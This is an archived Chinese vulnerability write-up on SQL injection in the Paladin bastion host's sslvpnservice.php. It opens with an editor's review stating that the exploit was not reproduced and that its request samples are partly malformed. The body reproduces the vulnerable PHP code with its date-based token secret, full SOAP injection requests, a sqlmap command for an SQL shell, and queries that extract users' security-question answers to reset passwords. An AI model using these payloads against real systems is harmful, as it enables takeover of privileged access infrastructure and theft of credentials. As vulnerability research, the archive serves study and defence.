---
source: "MrWQ/vulnerability-paper"
id: "vw-90c206a154b1d1550dc6bf2d"
entity_id: "ve-90c206a154b1d1550dc6bf2d"
schema_version: "1"
title: "帕拉迪堡垒机 (某些版本)sql 注入"
product: "帕拉迪堡垒机"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "约ST00001B105至B109前部分版本未完整测试；token按服务端日期生成，需存在user"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E5%B8%95%E6%8B%89%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA/%E5%B8%95%E6%8B%89%E8%BF%AA%E5%A0%A1%E5%9E%92%E6%9C%BA%20%28%E6%9F%90%E4%BA%9B%E7%89%88%E6%9C%AC%29sql%20%E6%B3%A8%E5%85%A5.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://mp.weixin.qq.com/s/vllWjQIXB7vQR0IjUgXpww"
source_status: "recorded"
---

# 帕拉迪堡垒机 (某些版本)sql 注入

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：帕拉迪堡垒机
- 本文讨论：sslvpnservice.php getAccountDetail user/acctid注入与预测token
- 版本、权限与配置前提：约ST00001B105至B109前部分版本未完整测试；token按服务端日期生成，需存在user
- 资料类型：堡垒机SQL源码与认证链研究；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- token不是完全常量，代码含Ymd日期，固定示例值不能跨日期复用
- SOAP使用SOAP-ENV前缀却声明SOAPENV，未绑定前缀；JSON字符串中硬换行和UA断行损坏请求
- 查询密保答案再重置是独立业务条件，读取答案不自动证明只需一个答案
- 作者承认版本不确定应保留，不能改成整段已验证范围
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 正式版本范围、鉴权Cookie必要性、token时区与截图待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/vllWjQIXB7vQR0IjUgXpww)

查看版本  

https://xxx.com/index.php/Public/about

ST00001B105<= 未知版本 < ST00001B109

上述版本中间的未知版本需要自行测试，具体到哪个版本就没有详细测试了

这里为了方便回显，寻找流程简单一点的，具体代码如下：  

```
function getAccountDetail($data)
{
    $obj = json_decode($data);
    $token = md5("pc#@%ccW".date("Ymd")."99!&cs");
    $acct = array();
    if($token == $obj->token)
    {
        $tmp = mysql_query("SELECT id FROM user WHERE account='".$obj->user."' limit 1");
        $row = mysql_fetch_array($tmp,MYSQL_ASSOC);
        if(empty($row))
        {
            return json_encode($acct);
        }
        $uid = $row['id'];
        $res = mysql_query("select a.*, d.dev_ip, d.dev_name from t_cfg_dev_list d, t_cfg_acct_list a, t_cfg_res_priv r where d.dev_prep = 0 AND d.dev_disable = 0 AND a.acct_disable = 0 AND a.dev_id = d.id and a.id = '".$obj->acctid."' and r.acct_id = a.id and r.usr_id = '" .$uid . "'");
        while($arr = mysql_fetch_assoc($res))
        {
            $acct[] = $arr;
        }
    }
    return json_encode($acct);
}

```

由于 token 硬编码，所以可以进入 if 导致 sql 注入，构造数据包如下：  

```http
POST /sslvpnservice.php HTTP/1.1
Host: xxxx
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580
<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>

```

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwP51MjEMaNLmq5faicVJib7cibQicZntmm4PfnfJ8yvibyj3821XDEfapNBib478OjpOpuMicnNFQmOibOia1Q/640?wx_fmt=png)

我们构造 sqlmap 方便注入的数据包：

```http
POST /sslvpnservice.php HTTP/1.1
Host: xxxx
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580
<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1*,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>

```

sqlmap 语句  

```
python2 sqlmap.py -r 1.txt --proxy http://127.0.0.1:8080 --force-ssl --freshqueries --dbms=mysql --delay 1 --sql-shell

```

查询 superman 账号 id, 因为 user 表中 id 参数对应 t_cfg_usr_epw 表中的 usr_id 参数，由此判定 user 表中 id 即为 userid

```
select id from user where account='superman' limit 0,1

```

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwP51MjEMaNLmq5faicVJib7cibIm9JEe6oKGMyuRWNBdN17xQsG5fOPxNvunQPARLAM6GzkGrDKzuQ6A/640?wx_fmt=png)

查询密保答案

```
select answer from user_secret where usr_id=1
select answer2 from user_secret where usr_id=1

```

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwP51MjEMaNLmq5faicVJib7cibgIPkiaDuDcPG5DLwPCLoBwYDZLrb83299Fw9yJCEdFNGyjdHrAsRjicw/640?wx_fmt=png)

我们试试 (答案 2 随便填写)

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwP51MjEMaNLmq5faicVJib7cibLZpG73mA1nXtibLiaVNmsEfpib3yBuGia1f4RJuiascicVNQL6CIweUcxD2Q/640?wx_fmt=png)

可以看到答案完全没问题

由于重置密码会自动生成密码并修改, 具有破坏性，按情况使用。

由于权限够高，可以通过注入读取服务器文件，大家自行构造吧！

---------------------------- 关注我查看其他文章 ----------------------------  

![](https://mmbiz.qpic.cn/mmbiz_png/5sMuNdjXwwOTI9R0HP1ahk5P93K3VZkSr4J0fG743YxiaC4ktBTw4d8yjLjIfPibkzmP7YX0gofU3YhAia7IM86xA/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
